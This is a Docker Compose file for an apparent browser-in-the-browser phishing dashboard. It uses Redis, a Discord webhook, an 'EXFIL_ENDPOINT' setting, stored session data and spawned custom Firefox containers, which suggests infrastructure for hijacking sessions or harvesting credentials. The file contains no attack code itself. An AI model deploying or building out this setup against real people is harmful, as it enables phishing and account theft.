services:
  bitb-dashboard:
    build:
      context: .
      dockerfile: Dockerfile.app
    container_name: bitb-dashboard
    restart: unless-stopped
    ports:
      - "8080:8080"
    environment:
      - REDIS_URL=redis://redis:6379
      - DISCORD_WEBHOOK=${DISCORD_WEBHOOK}
      - CLOUDFLARE_TOKEN=${CLOUDFLARE_TOKEN:-}
      - ADMIN_IPS=${ADMIN_IPS:-127.0.0.1}
      - SECRET_KEY=${SECRET_KEY:-changeme}
      - EXFIL_ENDPOINT=${EXFIL_ENDPOINT:-http://localhost:8080}
    volumes:
      - ./data:/data/sessions
      - /var/run/docker.sock:/var/run/docker.sock:ro
    networks:
      - bitb_net
    depends_on:
      - redis

  redis:
    image: redis:7-alpine
    container_name: bitb-redis
    restart: unless-stopped
    volumes:
      - redis_data:/data
    networks:
      - bitb_net

  # Build-only service for the Firefox browser image so Compose ensures the
  # `bitb-firefox-custom:latest` image is available for the app to spawn.
  bitb-firefox-builder:
    build:
      context: .
      dockerfile: Dockerfile.firefox-custom
    image: bitb-firefox-custom:latest
    container_name: bitb-firefox-builder
    entrypoint: ["/bin/true"]
    restart: "no"
    networks:
      - bitb_net

volumes:
  redis_data:

networks:
  bitb_net:
    driver: bridge
    name: bitb_net
